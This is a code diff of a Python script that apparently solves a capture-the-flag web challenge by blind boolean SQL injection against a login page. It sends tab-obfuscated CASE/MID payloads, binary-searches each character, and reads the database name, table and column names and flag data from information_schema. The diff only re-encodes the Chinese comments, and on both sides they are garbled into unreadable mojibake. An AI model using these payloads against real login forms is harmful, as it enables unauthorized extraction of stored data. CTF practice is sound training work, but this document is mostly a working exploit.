@@ -1,4 +1,3 @@
-#-*-coding:gb2312-*-
 import requests
 flag = ''
 url = "http://80.endpoint-937257753a42410f8b8e78ee52ca818a.m.ins.cloud.dasctf.com:81/login.php"
@@ -7,40 +6,40 @@ def check_char(i, mid):
     data = {'username':"\\",'password':"||"}
     #payload = f"||case\x09ord(mid(database()\x09from\x09{i}\x09for\x091))\x09when\x09{mid}\x09then\x091\x09else\x090\x09end%23"
     
-    # Êı¾İ¿âÃû
+    # æ•°æ®åº“å
     #payload = f"||case\x09when\x09ord(mid(database()\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
 
-    # ±íÃû
+    # è¡¨å
     #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(table_name)\x09from\x09information_schema.tables\x09where\x09table_schema=0x646173637466)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
     
-    # ÁĞÃû
+    # åˆ—å
     payload = f"||case\x09when\x09ord(mid((select\x09group_concat(column_name)\x09from\x09information_schema.columns\x09where\x09table_name=0x7573657273)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"    
     
-    # Êı¾İ
+    # æ•°æ®
     #payload = f"||case\x09when\x09ord(mid((select\x09group_concat(flag)\x09from\x09flagss)\x09from\x09{i}\x09for\x091))<{mid}\x09then\x091\x09else\x090\x09end#"
     data["password"] = payload
     #print(data)
     r = requests.post(url ,data=data)
-    return "µÇÂ¼³É¹¦" not in r.text
+    return "ç™»å½•æˆåŠŸ" not in r.text
     #return "Username or password error!" in r.text
 
 
 def find_char(i):
-    low, high = 32, 127  # ¶¨Òå¿É´òÓ¡×Ö·ûµÄASCII·¶Î§£¬´Ó32µ½126
-    while low < high:     # ½øĞĞ¶ş·Ö²éÕÒ£¬Ö±µ½low²»ÔÙĞ¡ÓÚhigh
-        mid = (low + high) // 2  # ¼ÆËãÖĞ¼äÖµ
-        if check_char(i, mid):  # ¼ì²éµ±Ç°ÖĞ¼äÖµ¶ÔÓ¦µÄ×Ö·ûÊÇ·ñÂú×ãÌõ¼ş
-            low = mid + 1  # Èç¹ûÂú×ãÌõ¼ş£¬ËµÃ÷Ä¿±ê×Ö·û¿ÉÄÜÔÚ¸ü¸ßµÄ·¶Î§£¬¸üĞÂlow
+    low, high = 32, 127  # å®šä¹‰å¯æ‰“å°å­—ç¬¦çš„ASCIIèŒƒå›´ï¼Œä»32åˆ°126
+    while low < high:     # è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œç›´åˆ°lowä¸å†å°äºhigh
+        mid = (low + high) // 2  # è®¡ç®—ä¸­é—´å€¼
+        if check_char(i, mid):  # æ£€æŸ¥å½“å‰ä¸­é—´å€¼å¯¹åº”çš„å­—ç¬¦æ˜¯å¦æ»¡è¶³æ¡ä»¶
+            low = mid + 1  # å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œè¯´æ˜ç›®æ ‡å­—ç¬¦å¯èƒ½åœ¨æ›´é«˜çš„èŒƒå›´ï¼Œæ›´æ–°low
         else:
-            high = mid  # Èç¹û²»Âú×ãÌõ¼ş£¬Ä¿±ê×Ö·ûÔÚµ±Ç°midÒÔÏÂ£¬¸üĞÂhigh
-    return chr(low - 1)  # ·µ»ØÕÒµ½µÄ×Ö·û£¬low¼õÈ¥1ÊÇÒòÎª×îºóÒ»ÂÖÑ­»·½áÊøÊ±lowÒÑ³¬³ö·¶Î§
+            high = mid  # å¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œç›®æ ‡å­—ç¬¦åœ¨å½“å‰midä»¥ä¸‹ï¼Œæ›´æ–°high
+    return chr(low - 1)  # è¿”å›æ‰¾åˆ°çš„å­—ç¬¦ï¼Œlowå‡å»1æ˜¯å› ä¸ºæœ€åä¸€è½®å¾ªç¯ç»“æŸæ—¶lowå·²è¶…å‡ºèŒƒå›´
 
 def main():
     global flag
-    for i in range(1, 40):  # ¼ÙÉè±íÃû³¤¶È²»³¬¹ı40¸ö×Ö·û
+    for i in range(1, 40):  # å‡è®¾è¡¨åé•¿åº¦ä¸è¶…è¿‡40ä¸ªå­—ç¬¦
         char = find_char(i)
         #print(char)
-        if char == chr(31):  # Èç¹û·µ»ØµÄÊÇ¿ØÖÆ×Ö·û£¬ËµÃ÷¿ÉÄÜÒÑ¾­Ã»ÓĞ¸ü¶à×Ö·ûÁË
+        if char == chr(31):  # å¦‚æœè¿”å›çš„æ˜¯æ§åˆ¶å­—ç¬¦ï¼Œè¯´æ˜å¯èƒ½å·²ç»æ²¡æœ‰æ›´å¤šå­—ç¬¦äº†
             break
         flag += char
         print(f"Current content: ~{flag}~")
